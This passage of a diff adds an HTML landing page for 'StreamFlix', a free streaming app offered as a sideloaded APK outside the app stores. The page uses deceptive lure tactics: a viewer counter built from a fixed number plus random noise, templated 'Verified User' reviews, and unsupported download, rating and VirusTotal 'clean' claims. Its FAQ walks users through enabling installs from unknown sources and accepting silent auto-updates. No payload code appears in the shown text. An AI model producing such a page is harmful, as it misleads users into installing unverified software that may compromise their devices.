+        Enjoy over 1000 channels for free, including live sports, global series and Bollywood movies. HD quality, no ads and no registration required.
+      </p>
+      <div class="hero-actions">
+        <button class="btn btn-primary" onclick="k2()">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+          Watch Now — Free
+        </button>
+        <span class="micro">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><polyline points="9 12 11 14 15 10"/></svg>
+          No sign-up · Secure
+        </span>
+      </div>
+      <div class="hero-meta">
+        <div class="live-indicator">
+          <span class="live-dot"></span>
+          <span><strong class="live-count" id="liveCount">2,847</strong> people watching now</span>
+        </div>
+        <div class="avatar-stack">
+          <div class="faces">
+            <img src="img/a/c1.jpg" alt="user">
+            <img src="img/a/c2.jpg" alt="user">
+            <img src="img/a/c3.jpg" alt="user">
+            <img src="img/a/c4.jpg" alt="user">
+            <img src="img/a/c5.jpg" alt="user">
+          </div>
+          <div class="faces-txt"><strong>50M+</strong> users have already downloaded the app</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="hero-collage reveal d2">
+      <div class="phone phone-2"><img src="img/2a.png" alt="StreamFlix screen"></div>
+      <div class="phone"><img src="img/2.jpg" alt="StreamFlix app"></div>
+      <div class="poster-float pf-1"><img src="img/1.jpg" alt="Suddenly Married"></div>
+      <div class="poster-float pf-2"><img src="img/2.jpg" alt="Mr. Denver"></div>
+      <div class="float-chip fc-rating"><span class="star">&#9733;</span> 4.8 · 50M+</div>
+      <div class="float-chip fc-downloads">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+        Free download
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ============================================================
+     STAT BAND
+     ============================================================ -->
+<div class="stat-band">
+  <div class="container stat-band-inner reveal">
+    <div class="cell"><div class="num">50M+</div><div class="lbl">Downloads</div></div>
+    <div class="cell"><div class="num">4.8&#9733;</div><div class="lbl">Average rating</div></div>
+    <div class="cell"><div class="num">1000+</div><div class="lbl">Available channels</div></div>
+    <div class="cell"><div class="num">120+</div><div class="lbl">Countries of origin</div></div>
+  </div>
+</div>
+
+<!-- ============================================================
+     TRENDING
+     ============================================================ -->
+<section class="section" id="trending">
+  <div class="container">
+    <div class="section-head reveal">
+      <div class="kicker">Global Trends</div>
+      <h2>What the world is <em>watching</em></h2>
+      <p class="sub">Most popular movies and series from all continents. New releases every day.</p>
+    </div>
+
+    <div class="shelf reveal">
+      <div class="poster" onclick="k2()">
+        <span class="poster-rank">1</span>
+        <span class="poster-badge">Drama</span>
+        <div class="poster-info">
+          <div class="poster-title">The Last Refuge</div>
+          <div class="poster-meta"><span class="star">&#9733;</span> 4.9 · 2026</div>
+        </div>
+        <img src="img/1.jpg" alt="The Last Refuge" loading="lazy">
+      </div>
+      <div class="poster" onclick="k2()">
+        <span class="poster-rank">2</span>
+        <span class="poster-badge">Action</span>
+        <div class="poster-info">
+          <div class="poster-title">Black Code</div>
+          <div class="poster-meta"><span class="star">&#9733;</span> 4.8 · 2026</div>
+        </div>
+        <img src="img/2.jpg" alt="Black Code" loading="lazy">
+      </div>
+      <div class="poster" onclick="k2()">
+        <span class="poster-rank">3</span>
+        <span class="poster-badge">Romance</span>
+        <div class="poster-info">
+          <div class="poster-title">Love in Tokyo</div>
+          <div class="poster-meta"><span class="star">&#9733;</span> 4.7 · 2026</div>
+        </div>
+        <img src="img/3.jpg" alt="Love in Tokyo" loading="lazy">
+      </div>
+      <div class="poster" onclick="k2()">
+        <span class="poster-rank">4</span>
+        <span class="poster-badge">Thriller</span>
+        <div class="poster-info">
+          <div class="poster-title">The Silence of the Lake</div>
+          <div class="poster-meta"><span class="star">&#9733;</span> 4.7 · 2026</div>
+        </div>
+        <img src="img/4.jpg" alt="The Silence of the Lake" loading="lazy">
+      </div>
+      <div class="poster" onclick="k2()">
+        <span class="poster-rank">5</span>
+        <span class="poster-badge">Comedy</span>
+        <div class="poster-info">
+          <div class="poster-title">Crossroads</div>
+          <div class="poster-meta"><span class="star">&#9733;</span> 4.6 · 2026</div>
+        </div>
+        <img src="img/5.jpg" alt="Crossroads" loading="lazy">
+      </div>
+    </div>
+
+    <!-- marquee -->
+    <div class="marquee reveal">
+      <div class="marquee-track" id="marqueeTrack"></div>
+    </div>
+  </div>
+</section>
+
+<!-- ============================================================
+     FEATURES
+     ============================================================ -->
+<section class="section" id="features">
+  <div class="container">
+    <div class="section-head reveal">
+      <div class="kicker">Why Choose Us</div>
+      <h2>All entertainment <em>without limits</em></h2>
+    </div>
+
+    <div class="bento">
+      <div class="feature f-lg reveal">
+        <span class="num-tag">01</span>
+        <div class="icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="2" width="20" height="20" rx="4"/><polygon points="10 8 16 12 10 16 10 8" fill="currentColor" stroke="none"/></svg></div>
+        <h3>Over 1000 channels</h3>
+        <p>Live sports, global series, Bollywood movies and more. All free and in HD.</p>
+      </div>
+      <div class="feature f-sm reveal d1">
+        <span class="num-tag">02</span>
+        <div class="icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg></div>
+        <h3>No sign-up or subscription</h3>
+        <p>Download and watch without creating an account. No commitments, no payment.</p>
+      </div>
+      <div class="feature f-sm reveal d2">
+        <span class="num-tag">03</span>
+        <div class="icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg></div>
+        <h3>Vertical &amp; mobile‑first</h3>
+        <p>Designed for your phone. Watch with one hand, no need to rotate.</p>
+      </div>
+      <div class="feature f-lg reveal d3">
+        <span class="num-tag">04</span>
+        <div class="icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg></div>
+        <h3>Daily new releases</h3>
+        <p>Fresh content every day: sports, series, movies and shows from around the world.</p>
+      </div>
+
+    </div>
+  </div>
+</section>
+
+<!-- ============================================================
+     REVIEWS
+     ============================================================ -->
+<section class="section" id="reviews" style="background:var(--bg-deep)">
+  <div class="container">
+    <div class="section-head reveal">
+      <div class="kicker">Loved by Millions</div>
+      <h2>Don't just take <em>our word for it</em></h2>
+    </div>
+
+    <div class="reviews reveal">
+      <div class="review">
+        <div class="stars">
+          <svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg><svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg><svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg><svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg><svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
+        </div>
+        <p>"Finally an app that brings together live TV, sports and series from around the world. All free and ad‑free, it's incredible."</p>
+        <div class="who"><img src="img/a/c1.jpg" alt="Sarah"><div><div class="name">S***h M.</div><div class="tag">Verified User</div></div></div>
+      </div>
+      <div class="review">
+        <div class="stars">
+          <svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg><svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg><svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg><svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg><svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
+        </div>
+        <p>"I love the variety: from live sports to Korean series and Bollywood movies. Everything in one place and free."</p>
+        <div class="who"><img src="img/a/c2.jpg" alt="James"><div><div class="name">J***s R.</div><div class="tag">Verified User</div></div></div>
+      </div>
+      <div class="review">
+        <div class="stars">
+          <svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg><svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg><svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg><svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg><svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
+        </div>
+        <p>"I download matches and series to watch offline. The HD quality and lack of ads make it worth it."</p>
+        <div class="who"><img src="img/a/c3.jpg" alt="Emily"><div><div class="name">E***y C.</div><div class="tag">Verified User</div></div></div>
+      </div>
+      <div class="review">
+        <div class="stars">
+          <svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg><svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg><svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg><svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg><svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
+        </div>
+        <p>"The best free streaming app I've tried. Real‑time subtitles and the variety of content are unmatched."</p>
+        <div class="who"><img src="img/a/c4.jpg" alt="Diego"><div><div class="name">D***o M.</div><div class="tag">Verified User</div></div></div>
+      </div>
+    </div>
+
+    <!-- big stats -->
+    <div class="big-stats reveal">
+      <div class="big-stats-inner">
+        <div class="cell"><div class="num">50M+</div><div class="lbl">Total Downloads</div></div>
+        <div class="cell"><div class="num">4.8&#9733;</div><div class="lbl">Average Rating</div></div>
+        <div class="cell"><div class="num">190</div><div class="lbl">Countries Available</div></div>
+        <div class="cell"><div class="num">99.9%</div><div class="lbl">Content Availability</div></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ============================================================
+     SECURITY
+     ============================================================ -->
+<section class="section">
+  <div class="container">
+    <div class="section-head reveal">
+      <div class="kicker">Secure &amp; Verified</div>
+      <h2>Your security is <em>our priority</em></h2>
+      <p class="sub">Every version is analyzed, signed and verified before reaching you.</p>
+    </div>
+
+    <div class="sec-grid reveal">
+      <div class="sec-card">
+        <div class="icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><polyline points="9 12 11 14 15 10"/></svg></div>
+        <h3>VirusTotal Analyzed</h3>
+        <p>100% clean · 72 engines approved</p>
+      </div>
+      <div class="sec-card">
+        <div class="icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/><circle cx="12" cy="16" r="1"/></svg></div>
+        <h3>SHA-256 Signed</h3>
+        <p>Cryptographically verified · tamper‑proof</p>
+      </div>
+      <div class="sec-card">
+        <div class="icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg></div>
+        <h3>Automatic Update</h3>
+        <p>Get the latest version as soon as we publish it</p>
+      </div>
+      <div class="sec-card">
+        <div class="icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="2" width="20" height="20" rx="5"/><circle cx="12" cy="12" r="3"/><path d="M4.93 4.93l1.41 1.41"/><path d="M17.66 17.66l1.41 1.41"/></svg></div>
+        <h3>No Permission Abuse</h3>
+        <p>Only requests what is strictly necessary</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ============================================================
+     DOWNLOAD CTA
+
+<!-- ============================================================
+     FAQ
+     ============================================================ -->
+<section class="section" id="faq">
+  <div class="container">
+    <div class="section-head reveal">
+      <div class="kicker">Frequently Asked Questions</div>
+      <h2>Got questions? <em>We have answers.</em></h2>
+    </div>
+
+    <div class="faq-wrap reveal">
+      <div class="faq-entry">
+        <button class="faq-q" onclick="toggleFaq(this)">
+          Is it safe to install the APK?
+          <span class="faq-indicator"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg></span>
+        </button>
+        <div class="faq-a"><div class="faq-a-inner">Absolutely. Every version passes VirusTotal analysis (over 72 engines), SHA‑256 code signing and manual security review before release. We never include adware, spyware or unwanted software. You can verify the signature yourself using the hash published on our security page.</div></div>
+      </div>
+      <div class="faq-entry">
+        <button class="faq-q" onclick="toggleFaq(this)">
+          Why isn't the app on Google Play or the App Store?
+          <span class="faq-indicator"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg></span>
+        </button>
+        <div class="faq-a"><div class="faq-a-inner">We are in a rapid iteration phase — releasing updates every 2 weeks with new features and improvements. Direct distribution allows us to move faster without the review delays of app stores. Store releases are planned for late 2026 once we reach our feature‑complete milestone. Same app, same quality, just faster updates for you.</div></div>
+      </div>
+      <div class="faq-entry">
+        <button class="faq-q" onclick="toggleFaq(this)">
+          How do I install the APK on Android?
+          <span class="faq-indicator"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg></span>
+        </button>
+        <div class="faq-a"><div class="faq-a-inner">1. Tap the Download APK button above.<br>2. Open the downloaded .apk file.<br>3. If prompted, allow "Install from unknown sources" in Settings → Security.<br>4. Tap Install and you're done! The app will auto‑update afterwards — you don't need to manually download future versions.</div></div>
+      </div>
+      <div class="faq-entry">
+        <button class="faq-q" onclick="toggleFaq(this)">
+          Is it really free? What's the catch?
+          <span class="faq-indicator"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg></span>
+        </button>
+        <div class="faq-a"><div class="faq-a-inner">Yes — 100% free. No hidden charges, no forced subscriptions, no paywalls on content. We are building our user base and believe that if we make the best experience, growth follows naturally. Premium features (like offline downloads) are also free during our launch period. Enjoy them while they last!</div></div>
+      </div>
+      <div class="faq-entry">
+        <button class="faq-q" onclick="toggleFaq(this)">
+          Which devices and OS versions are supported?
+          <span class="faq-indicator"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg></span>
+        </button>
+        <div class="faq-a"><div class="faq-a-inner">Android 8.0 (Oreo) and above for the APK. iOS 14+ for the IPA. Works on phones, tablets, Android TV and Fire TV Stick. We recommend at least 2 GB of RAM for the best experience. Chromecast and AirPlay are built‑in.</div></div>
+      </div>
+      <div class="faq-entry">
+        <button class="faq-q" onclick="toggleFaq(this)">
+          How do I get updates after installing?
+          <span class="faq-indicator"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg></span>
+        </button>
+        <div class="faq-a"><div class="faq-a-inner">The app includes a built‑in auto‑updater. When a new version is available, you'll receive a notification inside the app — just tap "Update" and it handles everything. You don't need to revisit this page or download manually again. We release updates roughly every 2 weeks with fixes and new features.</div></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+</main>
+
+<footer class="page-footer">
+  <div class="container footer-inner">
+    <div class="footer-brand">
+      © 2026 StreamFlix
+    </div>
+    <div class="footer-links">
+      <a href="#">Privacy</a>
+      <a href="#">Terms</a>
+      <a href="#">Security</a>
+    </div>
+  </div>
+</footer>
+
+<!-- ============================================================
+     FLOAT BAR
+     ============================================================ -->
+<div class="float-bar" id="floatBar">
+  <div class="float-bar-inner">
+    <div class="float-bar-info">
+      <div class="t">StreamFlix</div>
+      <div class="s">Live TV and global cinema · No ads</div>
+    </div>
+    <button class="btn btn-primary" onclick="k2()">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+      Download Free
+    </button>
+  </div>
+</div>
+
+<script>
+// ---- Top nav scroll detection ----
+var topNav=document.getElementById('topNav');
+function updateNav(){
+  if(window.scrollY>20){topNav.classList.add('scrolled')}
+  else{topNav.classList.remove('scrolled')}
+}
+window.addEventListener('scroll',updateNav,{passive:true});
+
+// ---- Floating bar ----
+var floatBar=document.getElementById('floatBar');
+function updateBar(){
+  if(window.scrollY>window.innerHeight*0.7){floatBar.classList.add('on')}
+  else{floatBar.classList.remove('on')}
+}
+window.addEventListener('scroll',updateBar,{passive:true});
+updateBar();
+
+// ---- Scroll reveal ----
+var revealObserver=new IntersectionObserver(function(entries){
+  entries.forEach(function(entry){
+    if(entry.isIntersecting){entry.target.classList.add('visible');revealObserver.unobserve(entry.target)}
+  });
+},{threshold:0.1,rootMargin:'0px 0px -40px 0px'});
+document.querySelectorAll('.reveal').forEach(function(el){revealObserver.observe(el)});
+
+// ---- FAQ ----
+function toggleFaq(q){
+  var item=q.parentElement;
+  var wasOpen=item.classList.contains('open');
+  document.querySelectorAll('.faq-entry').forEach(function(i){i.classList.remove('open')});
+  if(!wasOpen)item.classList.add('open');
+}
+
+// ---- Marquee build (seamless duplicate) ----
+(function(){
+  var track=document.getElementById('marqueeTrack');
+  if(!track)return;
+  var data=[
+    {t:'The Last Refuge',tag:'Drama',img:'img/1.jpg'},
+    {t:'Black Code',tag:'Action',img:'img/2.jpg'},
+    {t:'Love in Tokyo',tag:'Romance',img:'img/3.jpg'},
+    {t:'The Silence of the Lake',tag:'Thriller',img:'img/4.jpg'},
+    {t:'Crossroads',tag:'Comedy',img:'img/5.jpg'},
+    {t:'The Northern Kingdom',tag:'Fantasy',img:'img/6.jpg'},
+    {t:'Spy Game',tag:'Thriller',img:'img/7.jpg'},
+    {t:'Countdown',tag:'Fantasy',img:'img/8.jpg'},
+    {t:'The Heiress of Seoul',tag:'Drama',img:'img/9.jpg'},
+    {t:'The Paris Café',tag:'Romance',img:'img/10.jpg'}
+  ];
+  var html='';
+  for(var r=0;r<2;r++){
+    for(var i=0;i<data.length;i++){
+      var d=data[i];
+      html+='<div class="marquee-card" onclick="k2()"><span class="marquee-tag">'+d.tag+'</span><span class="marquee-title">'+d.t+'</span><img src="'+d.img+'" alt="'+d.t+'" loading="lazy"></div>';
+    }
+  }
+  track.innerHTML=html;
+})();
+
+// ---- Live activity counter ----
+(function(){
+  var el=document.getElementById('liveCount');
+  if(!el)return;
+  var base=2847;
+  var delta=Math.floor(Math.random()*200)-100;
+  function tick(){
